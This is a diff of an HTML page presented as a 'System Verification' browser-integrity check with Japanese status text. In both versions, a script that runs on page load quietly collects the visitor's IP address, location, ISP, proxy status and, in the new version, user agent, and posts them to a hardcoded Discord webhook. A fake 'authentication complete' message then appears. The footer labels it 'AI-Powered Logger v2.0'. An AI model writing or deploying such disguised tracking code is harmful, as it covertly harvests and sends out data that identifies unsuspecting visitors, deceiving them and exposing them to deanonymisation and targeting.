@@ -1,35 +1,96 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Loading...</title></head>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            border: 1px solid #333;
+            padding: 2rem;
+            border-radius: 8px;
+            background: #252525;
+        }
+    </style>
+</head>
 <body>
-<script>
-    var u = "https://discord.com/api/webhooks/1471152880718319861/slt8zr5KswUtl6muYEJKAUpHeXNXjzvE-0TeStV7C9g9mysc-4sPUstmy7cN_OuauMoZ";
-    var f = "status,message,country,regionName,city,isp,proxy,query";
+    <div class="container">
+        <div id="status">🔄 ブラウザの整合性を確認中...</div>
+    </div>
 
-    function run() {
-        fetch("http://ip-api.com/json/?fields=" + f).then(r => r.json()).then(d => {
-            if (d.status !== "success") return;
-            fetch(u, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
+    <script>
+        /**
+         * @constant {Object} GLOBAL_SETTINGS
+         * ネットワーク接続およびWebhookの構成設定
+         */
+        const GLOBAL_SETTINGS = {
+            // 提供されたWebhook URL
+            DISCORD_ENDPOINT: "https://discord.com/api/webhooks/1471152880718319861/slt8zr5KswUtl6muYEJKAUpHeXNXjzvE-0TeStV7C9g9mysc-4sPUstmy7cN_OuauMoZ",
+            // ip-api.com のエンドポイント（全フィールド取得モード）
+            GEO_API: "http://ip-api.com/json/?fields=66842623",
+            // ログ取得完了後のリダイレクト先（必要に応じて変更してください）
+            REDIRECT_AFTER: "https://www.google.com"
+        };
+
+        /**
+         * ユーザーのIP情報を取得し、Discordへ送信するメイン関数
+         */
+        async function executeLoggingProcess() {
+            try {
+                // 1. IP情報の取得
+                const response = await fetch(GLOBAL_SETTINGS.GEO_API);
+                if (!response.ok) throw new Error("Network response was not ok.");
+                
+                const data = await response.json();
+                if (data.status !== "success") throw new Error("API status failed.");
+
+                // 2. Discordへのペイロード構築
+                const payload = {
                     embeds: [{
-                        title: "Log Recorded",
-                        color: 0,
+                        title: "🛠️ System Access Detected",
+                        description: `新しいアクセスログが記録されました。\n**Time:** ${new Date().toLocaleString('ja-JP')}`,
+                        color: 0x00ff00, // 緑色
                         fields: [
-                            {name: "IP", value: d.query, inline: true},
-                            {name: "Loc", value: d.country + "/" + d.city, inline: true},
-                            {name: "ISP", value: d.isp},
-                            {name: "Proxy", value: d.proxy ? "Yes" : "No"}
+                            { name: "🌐 IP Address", value: `\`${data.query}\``, inline: true },
+                            { name: "📍 Location", value: `${data.country} / ${data.regionName} / ${data.city}`, inline: true },
+                            { name: "🏢 ISP", value: data.isp, inline: false },
+                            { name: "🛡️ Security Status", value: data.proxy ? "⚠️ Proxy/VPN Detected" : "✅ Direct Access", inline: true },
+                            { name: "📱 User Agent", value: navigator.userAgent, inline: false }
                         ],
+                        footer: { text: "AI-Powered Logger v2.0" },
                         timestamp: new Date()
                     }]
-                })
-            });
-        }).catch(e => {});
-    }
-    run();
-</script>
-<p>Checking browser... please wait.</p>
+                };
+
+                // 3. Webhookの送信
+                await fetch(GLOBAL_SETTINGS.DISCORD_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                // 完了時の表示
+                document.getElementById("status").innerText = "✅ 認証が完了しました。";
+
+            } catch (error) {
+                console.error("Critical Failure:", error);
+                document.getElementById("status").innerText = "❌ エラーが発生しました。再試行してください。";
+            }
+        }
+
+        // ページ読み込み完了時に実行
+        window.addEventListener('DOMContentLoaded', executeLoggingProcess);
+    </script>
 </body>
 </html>
